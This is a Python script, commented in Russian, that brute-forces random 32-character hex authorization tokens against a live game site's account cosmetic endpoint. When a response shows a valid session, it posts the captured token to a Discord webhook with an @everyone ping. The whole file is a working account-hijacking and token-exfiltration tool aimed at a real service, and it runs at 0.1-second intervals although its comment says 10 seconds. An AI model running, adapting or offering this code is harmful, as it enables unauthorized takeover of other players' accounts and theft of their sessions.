import json
import os
import secrets
import time
import requests

# URL эндпоинта
URL = "https://session.coolmathblox.ca/accounts/set_cosmetic"

# Discord Webhook URL (рекомендуется добавить в Secrets на GitHub как DISCORD_WEBHOOK)
# Если вебхук захардкожен, вставь его в кавычки вместо os.getenv(...)
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")

# Значение для проверки ответа (замени "G" на свое значение при необходимости)
TARGET_RESPONSE_VALUE = "Invalid login session, please try logging into your account again"


def generate_random_auth():
    # secrets.token_hex(16) генерирует 32-символьную hex-строку (16 байт = 32 hex-символа)
    # Содержит маленькие буквы (a-f) и цифры (0-9)
    return secrets.token_hex(16)


def send_discord_notification(auth_token):
    if not DISCORD_WEBHOOK:
        print("⚠️ Предупреждение: DISCORD_WEBHOOK не настроен!")
        return

    payload = {
        "content": f"@everyone Найден токен! Вот токен: `{auth_token}`",
        "allowed_mentions": {"parse": ["everyone"]},
    }

    try:
        res = requests.post(
            DISCORD_WEBHOOK,
            json=payload,
            headers={"Content-Type": "application/json"},
        )
        if res.status_code in (200, 204):
            print("📣 Уведомление успешно отправлено в Discord.")
        else:
            print(
                f"❌ Ошибка отправки в Discord ({res.status_code}): {res.text}"
            )
    except Exception as e:
        print(f"❌ Ошибка при отправке на Webhook: {e}")


print("🤖 Скрипт запущен с ротацией случайных токенов...")

while True:
    # 1. Генерируем случайный 32-значный токен
    random_auth = generate_random_auth()

    headers = {
        "Content-Type": "application/json",
        "authorization": random_auth,
    }

    body = {"type": "skin", "id": "remlin"}

    try:
        response = requests.post(URL, json=body, headers=headers)

        # Пытаемся распарсить JSON из ответа
        try:
            data = response.json()
            print(f"✅ Response (Auth: {random_auth}):", data)

            # --- Проверка условий ---

            # Условие 1: Ответ формата {"purchased": false}
            if isinstance(data, dict) and data.get("purchased") is False:
                print(
                    f"⚠️ Обнаружен purchased: False! Отправка токена {random_auth} в Discord..."
                )
                send_discord_notification(random_auth)

            # Условие 2: Ответ совпадает с целевым значением (например "G" или другое)
            elif data == TARGET_RESPONSE_VALUE:
                print(
                    f"ℹ️ Получен целевой ответ ({TARGET_RESPONSE_VALUE}), продолжаем работу..."
                )

        except json.JSONDecodeError:
            # Если сервер вернул не JSON, а обычный текст
            raw_text = response.text.strip()
            print(f"✅ Response (Raw Text): {raw_text}")

            if raw_text == TARGET_RESPONSE_VALUE:
                print(
                    f"ℹ️ Получен целевой ответ ({TARGET_RESPONSE_VALUE}), продолжаем работу..."
                )

    except Exception as err:
        print(f"❌ Error:", err)

    # Задержка 10 секунд перед следующим запросом
    time.sleep(0.1)
